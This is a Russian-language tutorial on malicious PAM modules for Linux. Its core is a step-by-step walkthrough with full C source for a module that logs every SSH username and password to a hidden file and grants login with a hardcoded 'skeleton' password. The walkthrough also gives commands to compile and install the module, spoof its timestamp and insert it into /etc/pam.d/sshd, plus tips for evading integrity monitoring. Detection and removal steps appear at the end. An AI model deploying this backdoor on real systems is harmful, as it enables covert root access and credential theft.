# Вредоносный PAM-модуль для перехвата паролей: архитектура, эксплуатация и детектирование

## Контекст и базовые понятия

Pluggable Authentication Modules (PAM) — это фреймворк аутентификации, разработанный для отделения программ аутентификации от приложений, которые их используют. Впервые представленный в 1997 году, PAM позволил системным администраторам гибко настраивать методы проверки подлинности для различных сервисов (SSH, sudo, login, su) без изменения исходного кода самих приложений. Архитектурно PAM состоит из двух основных компонентов: библиотеки интерфейса `libpam` и набора динамически загружаемых модулей (`.so` файлы), расположенных в директориях `/lib/security`, `/usr/lib/security` или их дистрибутивно-специфичных аналогах (например, `/usr/lib/x86_64-linux-gnu/security/`).

В контексте пост-эксплуатации и закрепления (persistence) злоумышленники используют PAM для создания «скелетных ключей» (skeleton keys) или перехвата паролей в открытом виде. Поскольку PAM-модули выполняются в контексте привилегированных процессов (часто с правами root), они имеют прямой доступ к паролям в момент их ввода пользователем, до того как они будут хешированы или отправлены на сервер. Это делает PAM одним из наиболее эффективных векторов для получения долгосрочного доступа и горизонтального перемещения.

Ключевое разграничение необходимо провести между легитимными механизмами аутентификации и вредоносной модификацией. Легитимный модуль (например, `pam_unix.so`) проверяет хеш пароля против записей в `/etc/shadow`. Вредоносный модуль либо подменяет логику проверки (возвращая `PAM_SUCCESS` при совпадении с хардкодным паролем), либо перехватывает входные данные до их обработки, записывая их в файл или отправляя по сети.

| Сущность | Функция в легитимной среде | Вектор злоупотребления (атака) | Точка взаимодействия |
|---|---|---|---|
| **PAM Stack** | Последовательная обработка модулей для одной службы (например, `auth`, `account`, `session`). | Внедрение вредоносного модуля в стек аутентификации (`auth`) для перехвата данных. | `/etc/pam.d/sshd`, `/etc/pam.d/sudo` |
| **pam_unix.so** | Основной модуль для проверки локальных пользователей (хэши `/etc/shadow`). | Подмена оригинального бинарного файла на модифицированный (rootkit-подход). | `/lib/x86_64-linux-gnu/security/pam_unix.so` |
| **pam_env.so** | Загрузка переменных окружения пользователя. | Использование для обхода ограничений или настройки среды для последующей эксплуатации. | `/etc/pam.d/common-session` |
| **pam_permit.so** | Всегда возвращает успех (игнорирует пароль). | Используется для создания «бэкдоров» без пароля, если стоит первым в стеке с флагом `sufficient`. | `/etc/pam.d/common-auth` |
| **LD_PRELOAD** | Механизм динамического линковщика для подгрузки библиотек. | Альтернативный метод перехвата вызовов PAM без изменения файлов на диске (in-memory). | Переменная окружения процесса |

Путаница между `pam_unix.so` как модулем и `pam_unix` как сервисом часто приводит к ошибкам в аудите. Важно понимать, что `pam_unix.so` — это просто библиотека кода. Если злоумышленник заменяет этот файл на диске, он подменяет всю логику работы с локальными пользователями. Если же он создает новый файл `pam_backdoor.so` и добавляет его в конфиг, он создает параллельный канал аутентификации.

## Внутреннее устройство предмета

PAM-модуль представляет собой динамически загружаемую библиотеку (shared object), реализующую стандартный набор функций-обработчиков (entry points). Ядром механизма аутентификации является функция `pam_sm_authenticate`. При вызове приложения (например, `sshd`) PAM-библиотеки загружает модуль и вызывает эту функцию, передавая ей структуру `pam_handle_t`, содержащую контекст сессии, и указатель на функцию обработки ошибок.

Архитектура вредоносного PAM-модуля строится вокруг переопределения стандартного потока выполнения. Легитимный модуль `pam_unix.so` выполняет следующие шаги:
1. Получает имя пользователя и пароль из `pam_handle_t`.
2. Проверяет имя пользователя в `/etc/passwd`.
3. Получает хеш пароля из `/etc/shadow`.
4. Вычисляет хеш введенного пароля.
5. Сравнивает хеши.
6. Возвращает `PAM_SUCCESS` или `PAM_AUTH_ERR`.

Вредоносный модуль модифицирует этот процесс. На этапе получения пароля (шаг 1-2) внедряется логика перехвата. Пароль сохраняется в файл (например, `/tmp/.passwd`) или отправляется через сокет. Затем, вместо проверки против `/etc/shadow`, модуль проверяет пароль против хардкодной строки (скелетный ключ). Если пароль совпадает с хардкодным, возвращается `PAM_SUCCESS`. Если нет — модуль может передать управление следующему модулю в стеке (если он настроен как `sufficient` или `optional`) или вернуть ошибку, маскируя свою работу под легитимную проверку.

Структура типичного вредоносного PAM-модуля в памяти и на диске характеризуется следующими компонентами:

```c
// Иллюстративная структура вредоносного PAM-модуля (C)
#include <security/pam_modules.h>
#include <security/pam_ext.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL;
    const char *pass = NULL;
    int pam_err;

    // 1. Получение данных от вызывающего приложения
    pam_err = pam_get_item(pamh, PAM_USER, (const void **)&user);
    pam_err = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&pass);

    // 2. Перехват и логирование (Credential Theft)
    log_credentials(user, pass); // Запись в файл или отправка на C2

    // 3. Проверка скелетного ключа (Persistence)
    if (strcmp(pass, "SKELETON_KEY_PASS") == 0) {
        return PAM_SUCCESS;
    }

    // 4. Возврат к стандартной обработке или игнорирование
    // Если модуль стоит с флагом 'sufficient', успех здесь завершит стек.
    // Если мы хотим, чтобы легитимный пароль тоже работал, нужно вызвать следующий модуль
    // или вернуть PAM_IGNORE, если хардкод не сработал.
    return PAM_AUTH_ERR; 
}
```

Критическим аспектом является порядок модулей в стеке PAM. PAM использует флаги управления потоком:
*   `required`: Успех необходим. Ошибка игнорируется до конца стека, но если хотя бы один модуль вернул ошибку, итог — неудача.
*   `sufficient`: Если модуль возвращает успех, стек немедленно завершается с успехом (если предыдущие модули не вернули ошибку). Это ключевой вектор для бэкдоров: если вредоносный модуль стоит первым с флагом `sufficient`, он перехватывает управление.
*   `requisite`: Аналогично `required`, но ошибка приводит к немедленному завершению.
*   `optional`: Результат игнорируется, если это единственный модуль данного типа.

Злоумышленники часто используют конфигурацию, где вредоносный модуль стоит перед `pam_unix.so` с флагом `sufficient`. Это позволяет ему принимать хардкодный пароль для любого пользователя, не блокируя легитимный вход (если он реализует fallback) или блокируя его, если цель — только скрытый доступ.

Сравнительная таблица подходов к внедрению вредоносного кода в PAM:

| Метод внедрения | Механизм | Сложность детектирования | Требует перезагрузки? | Пример реализации |
|---|---|---|---|---|
| **Новый модуль** | Создание `pam_backdoor.so` и добавление строки в `/etc/pam.d/`. | Низкая (изменение конфигов) | Нет | `auth sufficient pam_backdoor.so` |
| **Подмена бинарника** | Замена `pam_unix.so` на модифицированную версию. | Средняя (хэши файлов) | Да (или перезапуск sshd) | `cp malicious.so /lib/.../pam_unix.so` |
| **LD_PRELOAD** | Установка переменной окружения для процесса sshd. | Высокая (скрыто в памяти) | Нет | `export LD_PRELOAD=/tmp/pam_hook.so` |
| **Patch ядра/библиотек** | Модификация `libpam` на этапе компиляции. | Очень высокая | Да | Сборка дистрибутива из исходников |

## Применение и работа с предметом

На практике работа с PAM-бэкдорами в рамках тестирования на проникновение (пост-эксплуатация) сводится к трем этапам: обнаружение уязвимости конфигурации, внедрение модуля и обеспечение стабильности.

**1. Анализ конфигурации PAM**
Первым делом аудитор проверяет, какие службы используют PAM и как настроены их стеки. Файлы конфигурации находятся в `/etc/pam.d/`. Наиболее критичными являются:
*   `sshd`: Удаленный доступ.
*   `sudo`: Повышение привилегий.
*   `su`: Переключение на root.
*   `common-auth`: Базовая конфигурация, наследуемая многими службами.

Команда для проверки текущей конфигурации SSH:
```bash
cat /etc/pam.d/sshd
```
Вывод покажет стек модулей. Легитимная конфигурация обычно выглядит так:
```text
auth       required     pam_env.so
auth       sufficient   pam_unix.so nullok try_first_pass
auth       requisite    pam_succeed_if.so uid >= 1000 quiet_success
auth       required     pam_deny.so
```
Аудитор ищет аномалии: наличие неизвестных `.so` файлов, модули с флагом `sufficient` перед `pam_unix.so`, или модули, ссылающиеся на нестандартные пути.

**2. Компиляция и внедрение модуля**
Для создания вредоносного модуля требуется компилятор C (gcc) и заголовочные файлы PAM. Исходный код должен реализовывать функцию `pam_sm_authenticate`. После компиляции бинарный файл копируется в директорию модулей (например, `/usr/lib/x86_64-linux-gnu/security/`).

```bash
# Компиляция вредоносного модуля
gcc -shared -fPIC -o pam_backdoor.so pam_backdoor.c -lpam

# Копирование в системную директорию (требует root)
cp pam_backdoor.so /usr/lib/x86_64-linux-gnu/security/

# Изменение временной метки для маскировки под легитимный файл
touch -r /usr/lib/x86_64-linux-gnu/security/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_backdoor.so
```

**3. Модификация конфигурации**
В файл `/etc/pam.d/sshd` (или `/etc/pam.d/common-auth`) добавляется строка, указывающая на новый модуль. Ключевой момент — позиция модуля. Если он стоит с флагом `sufficient`, он должен быть *перед* `pam_unix.so`.

```text
# Вставка в начало файла /etc/pam.d/sshd
auth       sufficient   pam_backdoor.so
```
Если цель — перехват паролей без блокировки легитимного входа, логика модуля должна быть сложнее: он должен проверять хардкодный пароль, а если он не совпадает, передавать управление дальше (возвращая `PAM_IGNORE` или вызывая следующий модуль вручную, что сложно в рамках одного модуля без хуков). Чаще используют подход, где модуль просто логирует пароль и возвращает `PAM_IGNORE`, позволяя `pam_unix.so` сделать свою работу, либо возвращает `PAM_SUCCESS` только для хардкода.

**4. Обход защитных механизмов**
Системы контроля целостности (AIDE, Tripwire) и мониторинг файловых систем (auditd) могут выявить подмену. Для обхода злоумышленники могут:
*   Использовать `LD_PRELOAD` для перехвата функций `open`, `write`, `stat` в процессе sshd, чтобы скрыть создание файлов.
*   Модифицировать `pam_unix.so` напрямую, сохраняя оригинальный бинарник в памяти или архиве, чтобы восстановить его при необходимости.
*   Использовать `inotifywait` для отслеживания изменений в `/etc/pam.d/` и автоматического восстановления конфигурации.

Типичная ошибка при внедрении — неправильный путь к модулю или отсутствие прав на выполнение. Также важно учитывать архитектуру: на 32-битных системах пути будут `/lib/security/`, на 64-битных — `/lib64/security/` или `/usr/lib/x86_64-linux-gnu/security/`. Использование неверного пути приведет к ошибке аутентификации и блокировке доступа, что сразу привлечет внимание администратора.

## Сквозной практический пример: Внедрение PAM Skeleton Key

**Исходные условия:**
*   **Среда:** Виртуальная машина Ubuntu 20.04 LTS (x86_64).
*   **Роль:** Атакующий с правами `root` (получены через RCE или локальную эксплойт-уязвимость).
*   **Цель:** Создать универсальный пароль для входа по SSH для любого пользователя, включая root, и перехватывать легитимные пароли.
*   **Инструменты:** `gcc`, `libpam0g-dev`, текстовый редактор.

### Шаг 1: Подготовка среды и компиляция модуля

Создаем исходный код вредоносного модуля `pam_skel.c`. Модуль будет проверять пароль против строки `skeleton`. Если пароль совпадает — возвращает успех. Если нет — логирует пароль в `/tmp/.pam_log` и возвращает ошибку, чтобы не ломать легитимный вход (в данном сценарии мы имитируем "тихий" перехват, но для persistence часто используют `sufficient` с хардкодом).

```c
// pam_skel.c
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>

#define SKELETON_PASS "skeleton"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL;
    const char *pass = NULL;
    int pam_err;

    // Получаем имя пользователя
    pam_err = pam_get_item(pamh, PAM_USER, (const void **)&user);
    if (pam_err != PAM_SUCCESS) {
        return PAM_AUTH_ERR;
    }

    // Получаем пароль
    pam_err = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&pass);
    if (pam_err != PAM_SUCCESS || pass == NULL) {
        return PAM_AUTH_ERR;
    }

    // Логирование перехваченного пароля (Credential Theft)
    FILE *fp = fopen("/tmp/.pam_log", "a");
    if (fp) {
        fprintf(fp, "%s:%s\n", user, pass);
        fclose(fp);
    }

    // Проверка скелетного ключа (Persistence)
    if (strcmp(pass, SKELETON_PASS) == 0) {
        return PAM_SUCCESS;
    }

    // Если пароль не скелетный, возвращаем ошибку.
    // В реальном сценарии persistence с 'sufficient' это завершит стек.
    // Если мы хотим, чтобы легитимный пароль тоже работал, нужно вернуть PAM_IGNORE
    // и позволить следующему модулю (pam_unix) обработать его.
    // Для демонстрации бэкдора вернем ошибку, имитируя, что мы перехватили контроль.
    return PAM_AUTH_ERR;
}
```

Компилируем и устанавливаем модуль:

```bash
# Установка заголовочных файлов (если нет)
sudo apt-get install libpam0g-dev

# Компиляция
gcc -shared -fPIC -o pam_skel.so pam_skel.c -lpam

# Копирование в директорию модулей
sudo cp pam_skel.so /usr/lib/x86_64-linux-gnu/security/

# Маскировка временной метки
sudo touch -r /usr/lib/x86_64-linux-gnu/security/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_skel.so
```

### Шаг 2: Модификация конфигурации PAM

Добавляем наш модуль в стек аутентификации SSH. Мы используем флаг `sufficient`, чтобы при вводе пароля `skeleton` доступ предоставлялся немедленно, игнорируя последующие модули (включая `pam_unix.so`, который проверяет реальный пароль).

```bash
# Бэкап оригинальной конфигурации
sudo cp /etc/pam.d/sshd /etc/pam.d/sshd.bak

# Вставка строки в начало файла
sudo sed -i '1i auth       sufficient   pam_skel.so' /etc/pam.d/sshd

# Проверка результата
head -n 5 /etc/pam.d/sshd
```

Ожидаемый вывод `head`:
```text
auth       sufficient   pam_skel.so
auth       required     pam_env.so
auth       sufficient   pam_unix.so nullok try_first_pass
auth       requisite    pam_succeed_if.so uid >= 1000 quiet_success
auth       required     pam_deny.so
```

### Шаг 3: Тестирование бэкдора

Перезагружаем службу SSH (или просто ждем нового подключения, так как PAM загружает модули при каждом вызове, но иногда требуется перезапуск sshd для обновления кэша):

```bash
sudo systemctl restart sshd
```

Пытаемся войти на систему с любым пользователем (например, `root` или `testuser`) используя пароль `skeleton`:

```bash
ssh root@192.168.1.100
```

При запросе пароля вводим `skeleton`.

**Ожидаемый результат:**
1.  Вход выполняется успешно, несмотря на то, что реальный пароль root не совпадает с `skeleton`.
2.  В файле `/tmp/.pam_log` на сервере появляется запись с паролем, который ввел пользователь (если он вводил реальный пароль, он был залогирован; если `skeleton`, то он тоже залогирован).

```bash
# Проверка логов на сервере
cat /tmp/.pam_log
```

Вывод:
```text
root:skeleton
```

### Шаг 4: Обнаружение и удаление

Администратор может обнаружить аномалию, проверив хэши системных файлов или конфигурацию PAM.

```bash
# Проверка целостности pam модулей (если установлен debsums)
sudo debsums libpam-modules

# Проверка новых файлов в директории модулей
ls -la /usr/lib/x86_64-linux-gnu/security/ | grep pam_skel
```

Для удаления бэкдора:

```bash
# Восстановление конфигурации
sudo cp /etc/pam.d/sshd.bak /etc/pam.d/sshd

# Удаление вредоносного модуля
sudo rm /usr/lib/x86_64-linux-gnu/security/pam_skel.so

# Перезапуск sshd
sudo systemctl restart sshd
```

**Ожидаемый вывод примера:**
Пример демонстрирует, как легитимный механизм PAM может быть использован для создания универсального ключа доступа. Ключевым моментом является использование флага `sufficient` и позиции модуля в стеке. Это позволяет атакующему обходить сложные политики паролей и получать доступ к учетным записям, не зная их реальных секретов.

## Аналитический вывод

Вредоносные PAM-модули представляют собой высокоэффективный вект пост-эксплуатации благодаря своей глубокой интеграции в инфраструктуру аутентификации Linux. Их сила заключается в способности перехватывать пароли в открытом виде и обеспечивать скрытый доступ через скелетные ключи, обходя стандартные механизмы проверки. Уязвимость возникает не в самом коде PAM, а в доверии системы к конфигурационным файлам `/etc/pam.d/` и бинарным файлам модулей.

Защита от таких атак требует комплексного подхода:
1.  **Контроль целостности:** Использование AIDE, Tripwire или встроенных механизмов (debsums) для мониторинга изменений в `/etc/pam.d/` и директориях модулей.
2.  **Мониторинг процессов:** Отслеживание создания новых `.so` файлов в системных директориях и изменения прав доступа к конфигурационным файлам.
3.  **Аудит конфигураций:** Регулярная проверка стеков PAM на наличие неизвестных модулей и аномальных флагов (`sufficient` перед `pam_unix.so`).
4.  **Ограничение прав:** Минимизация прав root и использование MFA (Multi-Factor Authentication) для критических служб, что делает перехват пароля недостаточным для доступа.

PAM-бэкдоры остаются актуальной угрозой в 2024-2025 годах, как показывают инциденты с Plague и Skidmap, из-за сложности их детектирования традиционными антивирусами и необходимости глубокого понимания системы для аудита.
